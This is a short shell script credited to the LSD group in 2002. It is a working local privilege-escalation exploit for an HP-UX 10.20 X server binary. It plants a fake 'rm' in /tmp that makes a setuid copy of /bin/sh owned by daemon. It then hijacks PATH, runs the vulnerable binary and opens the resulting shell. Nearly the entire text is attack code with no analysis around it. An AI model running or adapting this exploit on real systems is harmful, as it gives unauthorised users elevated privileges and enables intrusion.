#!/bin/sh
## copyright LAST STAGE OF DELIRIUM may 2002 poland            *://lsd-pl.net/ #
## /usr/lib/X11/Xserver/ucode/screens/hp/rs.F3000                              #

echo "copyright LAST STAGE OF DELIRIUM may 2002 poland  //lsd-pl.net/"
echo "/usr/lib/X11/Xserver/ucode/screens/hp/rs.F3000 for HP-UX 10.20 700/800"

cat > /tmp/rm << 'EOF'
    /usr/bin/cp /bin/sh /tmp/sh
    /usr/bin/chown daemon /tmp/sh
    /usr/bin/chmod 4755 /tmp/sh
EOF
chmod 755 /tmp/rm

PATH=/tmp:$PATH
export PATH
/usr/lib/X11/Xserver/ucode/screens/hp/rs.F3000
sleep 3
sh

